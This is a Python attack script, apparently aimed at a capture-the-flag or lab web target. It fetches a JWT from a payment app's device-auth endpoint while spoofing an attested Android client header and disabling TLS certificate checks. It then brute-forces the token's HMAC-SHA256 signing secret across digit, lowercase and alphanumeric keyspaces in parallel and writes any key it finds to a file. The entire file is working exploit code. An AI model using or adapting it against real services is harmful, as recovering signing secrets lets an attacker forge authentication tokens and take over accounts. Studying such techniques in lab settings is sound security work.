import base64, hashlib, hmac, itertools, json, ssl, string, urllib.request
from multiprocessing import Pool

BASE = "https://web-3f25599ac74e8a91.web.h7tex.com"
CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
r = urllib.request.Request(BASE+"/api/v1/auth/device", data=json.dumps({"device_id":"short"}).encode(),
                           method="POST", headers={"Content-Type":"application/json","X-Meridian-Client":"MeridianPay-Android/3.2.1 (attested)"})
with urllib.request.urlopen(r, context=CTX, timeout=15) as f:
    TOKEN = json.loads(f.read())["token"]
h0, p0, s0 = TOKEN.split(".")
SIGNING = (h0+"."+p0).encode()
SIG = base64.urlsafe_b64decode(s0+"="*(-len(s0)%4))


def job(spec):
    """spec = (alphabet, prefix, total_len): enumerate keys prefix + suffix of length total_len-len(prefix)."""
    alphabet, prefix, total = spec
    new, sha, cd = hmac.new, hashlib.sha256, hmac.compare_digest
    chars = alphabet.encode()
    pre = prefix.encode()
    n = total - len(pre)
    if n < 0:
        return None
    if n == 0:
        return pre.decode() if cd(new(pre, SIGNING, sha).digest(), SIG) else None
    for tup in itertools.product(chars, repeat=n):
        k = pre + bytes(tup)
        if cd(new(k, SIGNING, sha).digest(), SIG):
            return k.decode()
    return None


def build(alphabet, maxlen, split_at):
    """jobs covering all lengths 1..maxlen, chunked by prefixes of length split_at."""
    jobs = []
    for L in range(1, maxlen + 1):
        if L <= split_at:
            jobs.append((alphabet, "", L))
        else:
            for p in map("".join, itertools.product(alphabet, repeat=split_at)):
                jobs.append((alphabet, p, L))
    return jobs


if __name__ == "__main__":
    D = string.digits
    LC = string.ascii_lowercase
    AN = string.ascii_letters + string.digits
    plan = [("digits 1..8", build(D, 8, 1)),
            ("lowercase 1..6", build(LC, 6, 1)),
            ("alnum 1..5", build(AN, 5, 2))]
    hit = None
    for name, jobs in plan:
        print("pass:", name, "jobs", len(jobs), flush=True)
        with Pool(12) as pool:
            for res in pool.imap_unordered(job, jobs, chunksize=1):
                if res:
                    hit = res; pool.terminate(); break
        print("  result:", hit, flush=True)
        if hit:
            break
    print("SHORT-KEY HIT:", repr(hit))
    if hit:
        open("jwt_secret.txt", "w").write(hit)
